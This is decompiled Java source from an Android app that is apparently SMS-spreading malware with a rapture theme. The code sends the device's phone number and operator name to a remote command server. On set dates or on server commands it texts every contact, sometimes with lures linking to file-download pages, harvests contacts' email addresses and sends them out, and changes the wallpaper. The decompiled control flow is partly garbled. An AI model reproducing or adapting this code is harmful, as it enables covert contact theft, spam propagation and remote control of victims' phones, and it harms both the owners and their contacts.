package com.YahwehOrNoWay;

import android.app.PendingIntent;
import android.app.WallpaperManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsManager;
import android.widget.Toast;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;
import java.util.TimerTask;
import org.ksoap2.SoapEnvelope;
import org.ksoap2.SoapFault;
import org.ksoap2.serialization.SoapObject;
import org.ksoap2.serialization.SoapPrimitive;
import org.ksoap2.serialization.SoapSerializationEnvelope;
import org.ksoap2.transport.AndroidHttpTransport;

class theword$1
  extends TimerTask
{
  final theword this$0;
  
  theword$1(theword paramtheword, String paramString1, String paramString2) {}
  
  public void run()
  {
    String str45 = "http://tempuri.org/openmic";
    String str40 = "openmic";
    String str41 = "http://tempuri.org/";
    String str49 = "http://biofaction.no-ip.biz/talktome.asmx";
    Date localDate = new java/util/Date;
    localDate.<init>();
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    String str2 = "MMddyyyy";
    localObject1 = localSimpleDateFormat;
    localObject2 = str2;
    ((SimpleDateFormat)localObject1).<init>((String)localObject2);
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localObject1 = localSimpleDateFormat;
    localObject2 = localDate;
    str2 = ((SimpleDateFormat)localObject1).format((Date)localObject2);
    localObject1 = localStringBuilder;
    localObject2 = str2;
    ((StringBuilder)localObject1).<init>((String)localObject2);
    str2 = localStringBuilder.toString();
    String str25 = "05212011";
    boolean bool1 = str2.matches(str25);
    Uri localUri4;
    Uri localUri3;
    Uri localUri2;
    Uri localUri1;
    String str38;
    String str33;
    String str37;
    String str39;
    String str29;
    String str34;
    String str28;
    String str43;
    String str42;
    String str35;
    String str36;
    String str47;
    String str30;
    String str46;
    String str44;
    String str31;
    Object localObject6;
    SQLiteDatabase localSQLiteDatabase;
    if (bool1)
    {
      localUri4 = ContactsContract.Contacts.CONTENT_URI;
      localUri3 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
      localUri2 = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
      localUri1 = ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI;
      str38 = "_id";
      str33 = "display_name";
      str37 = "has_phone_number";
      str39 = "lookup";
      str29 = "contact_id";
      str34 = "contact_id";
      str28 = "contact_id";
      str43 = "data1";
      str42 = "data2";
      str35 = "data1";
      str36 = "data2";
      str47 = "data4";
      str30 = "data7";
      str46 = "data8";
      str44 = "data9";
      str31 = "data10";
      localObject24 = null;
      localObject24 = (String[])localObject24;
      String str32 = "mydb.db";
      String str48 = "myTable";
      localObject1 = this;
      localObject1 = this$0;
      localObject6 = localObject1;
      int i27 = 1;
      str26 = null;
      localObject1 = localObject6;
      localObject2 = str32;
      int i = i27;
      String str1 = str26;
      localSQLiteDatabase = ((theword)localObject1).openOrCreateDatabase((String)localObject2, i, str1);
    }
    try
    {
      localObject6 = "create table if not exists myTable (status VARCHAR);";
      localObject1 = localSQLiteDatabase;
      localObject2 = localObject6;
      ((SQLiteDatabase)localObject1).execSQL((String)localObject2);
      localObject6 = "Insert INTO myTable Values ('endoftheworld')";
      localObject1 = localSQLiteDatabase;
      localObject2 = localObject6;
      ((SQLiteDatabase)localObject1).execSQL((String)localObject2);
      localSQLiteDatabase.close();
    }
    catch (SQLiteException localSQLiteException)
    {
      int j;
      Object localObject22;
      Object localObject19;
      Object localObject7;
      ContentResolver localContentResolver;
      Object localObject4;
      Object localObject5;
      Cursor localCursor1;
      SmsManager localSmsManager;
      int k;
      boolean bool2;
      for (;;) {}
    }
    j = 5;
    localObject1 = j;
    localObject1 = new String[localObject1];
    Object localObject24 = localObject1;
    j = 6;
    localObject1 = j;
    localObject1 = new String[localObject1];
    localObject22 = localObject1;
    j = 0;
    localObject19 = "Cannot talk right now, the world is about to end";
    localObject22[j] = localObject19;
    j = 1;
    localObject19 = "Jebus is way over due for a come back";
    localObject22[j] = localObject19;
    j = 2;
    localObject19 = "Its the Raptures,praise Jebus";
    localObject22[j] = localObject19;
    j = 3;
    localObject19 = "Prepare to meet thy maker,make sure to hedge your bet just in case the Muslims’ were right";
    localObject22[j] = localObject19;
    j = 4;
    localObject19 = "Just saw the four horsemen of the apocalypse and man did they have the worst case of road rage";
    localObject22[j] = localObject19;
    j = 5;
    localObject19 = "Es el fin del mundo";
    localObject22[j] = localObject19;
    localObject1 = this;
    localObject1 = this$0;
    localObject7 = localObject1;
    localContentResolver = ((theword)localObject7).getContentResolver();
    localObject4 = ContactsContract.Contacts.CONTENT_URI;
    localObject5 = null;
    localObject7 = null;
    localObject19 = null;
    str26 = null;
    localCursor1 = localContentResolver.query((Uri)localObject4, (String[])localObject5, (String)localObject7, (String[])localObject19, str26);
    localSmsManager = SmsManager.getDefault();
    k = localCursor1.getCount();
    if (k > 0)
    {
      bool2 = localCursor1.moveToNext();
      if (bool2) {}
    }
    else
    {
      localObject1 = this;
    }
    try
    {
      localObject1 = this$0;
      localObject8 = localObject1;
      localObject8 = ((theword)localObject8).getAssets();
      localObject19 = "colbert.jpg";
      localObject8 = ((AssetManager)localObject8).open((String)localObject19);
      localBitmap = BitmapFactory.decodeStream((InputStream)localObject8);
      localObject1 = this;
      localObject1 = this$0;
      localObject8 = localObject1;
      localWallpaperManager = WallpaperManager.getInstance((Context)localObject8);
      localWallpaperManager.setBitmap(localBitmap);
    }
    catch (IOException localIOException2)
    {
      Object localObject8;
      Bitmap localBitmap;
      WallpaperManager localWallpaperManager;
      boolean bool3;
      int m;
      Object localObject9;
      Object localObject20;
      Object localObject21;
      String str27;
      int n;
      boolean bool4;
      for (;;) {}
    }
    localObject8 = localStringBuilder.toString();
    localObject19 = "05222011";
    bool3 = ((String)localObject8).matches((String)localObject19);
    if (bool3)
    {
      localUri4 = ContactsContract.Contacts.CONTENT_URI;
      localUri3 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
      localUri2 = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
      localUri1 = ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI;
      str38 = "_id";
      str33 = "display_name";
      str37 = "has_phone_number";
      str39 = "lookup";
      str29 = "contact_id";
      str34 = "contact_id";
      str28 = "contact_id";
      str43 = "data1";
      str42 = "data2";
      str35 = "data1";
      str36 = "data2";
      str47 = "data4";
      str30 = "data7";
      str46 = "data8";
      str44 = "data9";
      str31 = "data10";
      localObject24 = null;
      localObject24 = (String[])localObject24;
      m = 5;
      localObject1 = m;
      localObject1 = new String[localObject1];
      localObject24 = localObject1;
      localObject22 = "Looks like Jebus is a no show, maybe Judaism was on to something";
      localObject1 = this;
      localObject1 = this$0;
      localObject9 = localObject1;
      localContentResolver = ((theword)localObject9).getContentResolver();
      localObject19 = ContactsContract.Contacts.CONTENT_URI;
      str26 = null;
      localObject20 = null;
      localObject21 = null;
      str27 = null;
      localObject9 = localContentResolver;
      localCursor1 = ((ContentResolver)localObject9).query((Uri)localObject19, str26, (String)localObject20, (String[])localObject21, str27);
      localObject4 = SmsManager.getDefault();
      n = localCursor1.getCount();
      if (n > 0)
      {
        label755:
        bool4 = localCursor1.moveToNext();
        if (bool4) {
          break label1787;
        }
      }
      localObject1 = this;
    }
    label1787:
    do
    {
      for (;;)
      {
        try
        {
          localObject1 = this$0;
          localObject10 = localObject1;
          localObject10 = ((theword)localObject10).getAssets();
          localObject19 = "hammer.jpg";
          localObject10 = ((AssetManager)localObject10).open((String)localObject19);
          localBitmap = BitmapFactory.decodeStream((InputStream)localObject10);
          localObject1 = this;
          localObject1 = this$0;
          localObject10 = localObject1;
          localWallpaperManager = WallpaperManager.getInstance((Context)localObject10);
          localWallpaperManager.setBitmap(localBitmap);
        }
        catch (IOException localIOException1)
        {
          Object localObject10;
          SoapObject localSoapObject;
          Object localObject3;
          SoapSerializationEnvelope localSoapSerializationEnvelope;
          int i1;
          AndroidHttpTransport localAndroidHttpTransport;
          Object localObject23;
          String str50;
          Object localObject11;
          Context localContext;
          int i28;
          Toast localToast;
          boolean bool5;
          String str3;
          boolean bool7;
          Object localObject13;
          int i4;
          boolean bool8;
          String str4;
          int i5;
          String str53;
          String str5;
          int i6;
          String str54;
          Random localRandom;
          int i29;
          String str6;
          int i7;
          String str7;
          int i8;
          Object localObject14;
          Cursor localCursor3;
          int i30;
          String str51;
          String str10;
          int i12;
          String str11;
          int i13;
          String str12;
          int i14;
          String str13;
          int i15;
          Object localObject15;
          String str16;
          int i18;
          String str17;
          int i19;
          String str18;
          int i20;
          String str19;
          int i21;
          Object localObject16;
          String str23;
          int i25;
          Object localObject17;
          Cursor localCursor2;
          boolean bool12;
          String str24;
          int i26;
          String str52;
          Object localObject18;
          continue;
        }
        try
        {
          localSoapObject = new org/ksoap2/serialization/SoapObject;
          localObject1 = localSoapObject;
          localObject2 = str41;
          localObject3 = str40;
          ((SoapObject)localObject1).<init>((String)localObject2, (String)localObject3);
          localObject10 = "cell";
          localObject1 = this;
          localObject1 = val$cellnumb;
          localObject19 = localObject1;
          localObject1 = localSoapObject;
          localObject2 = localObject10;
          localObject3 = localObject19;
          ((SoapObject)localObject1).addProperty((String)localObject2, localObject3);
          localObject10 = "opname";
          localObject1 = this;
          localObject1 = val$opname;
          localObject19 = localObject1;
          localObject1 = localSoapObject;
          localObject2 = localObject10;
          localObject3 = localObject19;
          ((SoapObject)localObject1).addProperty((String)localObject2, localObject3);
          localSoapSerializationEnvelope = new org/ksoap2/serialization/SoapSerializationEnvelope;
          i1 = 110;
          localObject1 = localSoapSerializationEnvelope;
          localObject2 = i1;
          ((SoapSerializationEnvelope)localObject1).<init>(localObject2);
          i1 = 1;
          localObject1 = i1;
          localObject2 = localSoapSerializationEnvelope;
          dotNet = localObject1;
          localObject1 = localSoapSerializationEnvelope;
          localObject2 = localSoapObject;
          ((SoapSerializationEnvelope)localObject1).setOutputSoapObject(localObject2);
          localAndroidHttpTransport = new org/ksoap2/transport/AndroidHttpTransport;
          localObject1 = localAndroidHttpTransport;
          localObject2 = str49;
          ((AndroidHttpTransport)localObject1).<init>((String)localObject2);
          localObject1 = localAndroidHttpTransport;
          localObject2 = str45;
          localObject3 = localSoapSerializationEnvelope;
          ((AndroidHttpTransport)localObject1).call((String)localObject2, (SoapEnvelope)localObject3);
          localObject23 = localSoapSerializationEnvelope.getResponse();
          localObject23 = (SoapPrimitive)localObject23;
          str50 = ((SoapPrimitive)localObject23).toString();
          localObject1 = this;
          localObject1 = this$0;
          localObject11 = localObject1;
          localContext = ((theword)localObject11).getApplicationContext();
          i28 = 1;
          localObject1 = localContext;
          localObject2 = str50;
          localObject3 = i28;
          localToast = Toast.makeText((Context)localObject1, (CharSequence)localObject2, localObject3);
          localToast.show();
          localObject11 = "formula401";
          localObject1 = str50;
          localObject2 = localObject11;
          bool5 = ((String)localObject1).matches((String)localObject2);
          if (bool5)
          {
            localUri4 = ContactsContract.Contacts.CONTENT_URI;
            localUri3 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            localUri2 = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
            localUri1 = ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI;
            str38 = "_id";
            str33 = "display_name";
            str37 = "has_phone_number";
            str39 = "lookup";
            str29 = "contact_id";
            str34 = "contact_id";
            str28 = "contact_id";
            str43 = "data1";
            str42 = "data2";
            str35 = "data1";
            str36 = "data2";
            str47 = "data4";
            str30 = "data7";
            str46 = "data8";
            str44 = "data9";
            str31 = "data10";
            localObject24 = null;
            localObject24 = (String[])localObject24;
            int i2 = 2;
            localObject1 = i2;
            localObject1 = new String[localObject1];
            localObject24 = localObject1;
            i2 = 3;
            localObject1 = i2;
            localObject1 = new String[localObject1];
            localObject22 = localObject1;
            i2 = 0;
            localObject19 = "http://turbobit.net/3qijra41byed.html";
            localObject22[i2] = localObject19;
            i2 = 1;
            localObject19 = "http://turbobit.net/9fzlltk2eptu.html";
            localObject22[i2] = localObject19;
            i2 = 2;
            localObject19 = "http://turbobit.net/9c19sk0tcg8z.html.";
            localObject22[i2] = localObject19;
            localObject1 = this;
            localObject1 = this$0;
            Object localObject12 = localObject1;
            localContentResolver = ((theword)localObject12).getContentResolver();
            localObject19 = ContactsContract.Contacts.CONTENT_URI;
            str26 = null;
            localObject20 = null;
            localObject21 = null;
            str27 = null;
            localObject12 = localContentResolver;
            localCursor1 = ((ContentResolver)localObject12).query((Uri)localObject19, str26, (String)localObject20, (String[])localObject21, str27);
            localObject4 = SmsManager.getDefault();
            int i3 = localCursor1.getCount();
            if (i3 > 0)
            {
              boolean bool6 = localCursor1.moveToNext();
              if (bool6) {
                continue;
              }
            }
          }
          str3 = "pacem";
          localObject1 = str50;
          localObject2 = str3;
          bool7 = ((String)localObject1).matches((String)localObject2);
          if (!bool7) {
            continue;
          }
          localObject1 = this;
          localObject1 = this$0;
          localObject13 = localObject1;
          localContentResolver = ((theword)localObject13).getContentResolver();
          localObject19 = ContactsContract.Contacts.CONTENT_URI;
          str26 = null;
          localObject20 = null;
          localObject21 = null;
          str27 = null;
          localObject13 = localContentResolver;
          localCursor1 = ((ContentResolver)localObject13).query((Uri)localObject19, str26, (String)localObject20, (String[])localObject21, str27);
          i4 = localCursor1.getCount();
          if (i4 <= 0) {
            continue;
          }
        }
        catch (SoapFault localSoapFault)
        {
          continue;
          str23 = "_id";
          localObject1 = localCursor1;
          localObject2 = str23;
          i25 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
          localObject1 = localCursor1;
          localObject2 = i25;
          str53 = ((Cursor)localObject1).getString(localObject2);
          localObject19 = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
          str26 = null;
          localObject20 = "contact_id = ?";
          i25 = 1;
          localObject21 = new String[i25];
          i25 = 0;
          localObject21[i25] = str53;
          str27 = null;
          localObject17 = localContentResolver;
          localCursor2 = ((ContentResolver)localObject17).query((Uri)localObject19, str26, (String)localObject20, (String[])localObject21, str27);
          bool12 = localCursor2.moveToNext();
          if (bool12) {
            continue;
          }
          localCursor2.close();
        }
        catch (Exception localException)
        {
          continue;
          str24 = "data1";
          localObject1 = localCursor2;
          localObject2 = str24;
          i26 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
          localObject1 = localCursor2;
          localObject2 = i26;
          str52 = ((Cursor)localObject1).getString(localObject2);
          localObject1 = this;
          localObject1 = this$0;
          localObject18 = localObject1;
          localObject1 = localObject18;
          localObject2 = str52;
          ((theword)localObject1).poster((String)localObject2);
        }
      }
      bool8 = localCursor1.moveToNext();
      if (bool8) {
        break label2497;
      }
      return;
      str4 = "_id";
      localObject1 = localCursor1;
      localObject2 = str4;
      i5 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i5;
      str53 = ((Cursor)localObject1).getString(localObject2);
      str5 = "display_name";
      localObject1 = localCursor1;
      localObject2 = str5;
      i6 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i6;
      str54 = ((Cursor)localObject1).getString(localObject2);
      localRandom = new java/util/Random;
      localRandom.<init>();
      i29 = 0;
      str6 = "has_phone_number";
      localObject1 = localCursor1;
      localObject2 = str6;
      i7 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i7;
      str7 = ((Cursor)localObject1).getString(localObject2);
      i8 = Integer.parseInt(str7);
      if (i8 <= 0) {
        break;
      }
      localObject1 = this;
      localObject1 = this$0;
      localObject14 = localObject1;
      localObject4 = ((theword)localObject14).getContentResolver();
      localObject5 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
      localObject14 = null;
      localObject19 = new java/lang/StringBuilder;
      str26 = "contact_id = ";
      ((StringBuilder)localObject19).<init>(str26);
      localObject1 = localObject19;
      localObject2 = str53;
      localObject19 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject19 = ((StringBuilder)localObject19).toString();
      str26 = null;
      localObject20 = null;
      localCursor3 = ((ContentResolver)localObject4).query((Uri)localObject5, (String[])localObject14, (String)localObject19, str26, (String)localObject20);
      for (;;)
      {
        boolean bool9 = localCursor3.moveToNext();
        if (!bool9) {
          break;
        }
        int i9 = 5;
        localObject1 = localRandom;
        localObject2 = i9;
        i9 = ((Random)localObject1).nextInt(localObject2);
        i30 = i9 + 1;
        String str8 = "display_name";
        localObject1 = localCursor3;
        localObject2 = str8;
        int i10 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
        localObject1 = localCursor3;
        localObject2 = i10;
        str51 = ((Cursor)localObject1).getString(localObject2);
        String str9 = "data1";
        localObject1 = localCursor3;
        localObject2 = str9;
        int i11 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
        localObject1 = localCursor3;
        localObject2 = i11;
        localObject5 = ((Cursor)localObject1).getString(localObject2);
        str10 = null;
        localObject19 = localObject22[i30];
        str26 = null;
        localObject20 = null;
        localObject4 = localSmsManager;
        ((SmsManager)localObject4).sendTextMessage((String)localObject5, str10, (String)localObject19, str26, (PendingIntent)localObject20);
      }
      str10 = "_id";
      localObject1 = localCursor1;
      localObject2 = str10;
      i12 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i12;
      str53 = ((Cursor)localObject1).getString(localObject2);
      str11 = "display_name";
      localObject1 = localCursor1;
      localObject2 = str11;
      i13 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i13;
      str54 = ((Cursor)localObject1).getString(localObject2);
      localRandom = new java/util/Random;
      localRandom.<init>();
      i29 = 0;
      str12 = "has_phone_number";
      localObject1 = localCursor1;
      localObject2 = str12;
      i14 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i14;
      str13 = ((Cursor)localObject1).getString(localObject2);
      i15 = Integer.parseInt(str13);
      if (i15 <= 0) {
        break label755;
      }
      localObject1 = this;
      localObject1 = this$0;
      localObject15 = localObject1;
      localObject15 = ((theword)localObject15).getContentResolver();
      localObject19 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
      str26 = null;
      localObject20 = new java/lang/StringBuilder;
      localObject21 = "contact_id = ";
      ((StringBuilder)localObject20).<init>((String)localObject21);
      localObject1 = localObject20;
      localObject2 = str53;
      localObject20 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject20 = ((StringBuilder)localObject20).toString();
      localObject21 = null;
      str27 = null;
      localCursor3 = ((ContentResolver)localObject15).query((Uri)localObject19, str26, (String)localObject20, (String[])localObject21, str27);
      for (;;)
      {
        boolean bool10 = localCursor3.moveToNext();
        if (!bool10) {
          break;
        }
        String str14 = "display_name";
        localObject1 = localCursor3;
        localObject2 = str14;
        int i16 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
        localObject1 = localCursor3;
        localObject2 = i16;
        str51 = ((Cursor)localObject1).getString(localObject2);
        String str15 = "data1";
        localObject1 = localCursor3;
        localObject2 = str15;
        int i17 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
        localObject1 = localCursor3;
        localObject2 = i17;
        localObject5 = ((Cursor)localObject1).getString(localObject2);
        str16 = null;
        str26 = null;
        localObject20 = null;
        localObject19 = localObject22;
        ((SmsManager)localObject4).sendTextMessage((String)localObject5, str16, (String)localObject19, str26, (PendingIntent)localObject20);
      }
      str16 = "_id";
      localObject1 = localCursor1;
      localObject2 = str16;
      i18 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i18;
      str53 = ((Cursor)localObject1).getString(localObject2);
      str17 = "display_name";
      localObject1 = localCursor1;
      localObject2 = str17;
      i19 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i19;
      str54 = ((Cursor)localObject1).getString(localObject2);
      localRandom = new java/util/Random;
      localRandom.<init>();
      i29 = 0;
      str18 = "has_phone_number";
      localObject1 = localCursor1;
      localObject2 = str18;
      i20 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor1;
      localObject2 = i20;
      str19 = ((Cursor)localObject1).getString(localObject2);
      i21 = Integer.parseInt(str19);
    } while (i21 <= 0);
    localObject1 = this;
    localObject1 = this$0;
    localObject16 = localObject1;
    localObject16 = ((theword)localObject16).getContentResolver();
    localObject19 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    str26 = null;
    localObject20 = new java/lang/StringBuilder;
    localObject21 = "contact_id = ";
    ((StringBuilder)localObject20).<init>((String)localObject21);
    localObject1 = localObject20;
    localObject2 = str53;
    localObject20 = ((StringBuilder)localObject1).append((String)localObject2);
    localObject20 = ((StringBuilder)localObject20).toString();
    localObject21 = null;
    str27 = null;
    localCursor3 = ((ContentResolver)localObject16).query((Uri)localObject19, str26, (String)localObject20, (String[])localObject21, str27);
    for (;;)
    {
      boolean bool11 = localCursor3.moveToNext();
      if (!bool11) {
        break;
      }
      bool11 = true;
      localObject1 = localRandom;
      localObject2 = bool11;
      int i22 = ((Random)localObject1).nextInt(localObject2);
      i30 = i22 + 1;
      String str20 = "display_name";
      localObject1 = localCursor3;
      localObject2 = str20;
      int i23 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor3;
      localObject2 = i23;
      str51 = ((Cursor)localObject1).getString(localObject2);
      String str21 = "data1";
      localObject1 = localCursor3;
      localObject2 = str21;
      int i24 = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      localObject1 = localCursor3;
      localObject2 = i24;
      localObject5 = ((Cursor)localObject1).getString(localObject2);
      String str22 = null;
      localObject19 = new java/lang/StringBuilder;
      str26 = "You have to download this and thank me later ";
      ((StringBuilder)localObject19).<init>(str26);
      str26 = localObject22[i30];
      localObject19 = ((StringBuilder)localObject19).append(str26);
      localObject19 = ((StringBuilder)localObject19).toString();
      str26 = null;
      localObject20 = null;
      ((SmsManager)localObject4).sendTextMessage((String)localObject5, str22, (String)localObject19, str26, (PendingIntent)localObject20);
    }
  }
}

/* Location:
 * Qualified Name:     com.YahwehOrNoWay.theword.1
 * Java Class Version: 1.2 (46.0)
 * JD-Core Version:    0.7.1
 */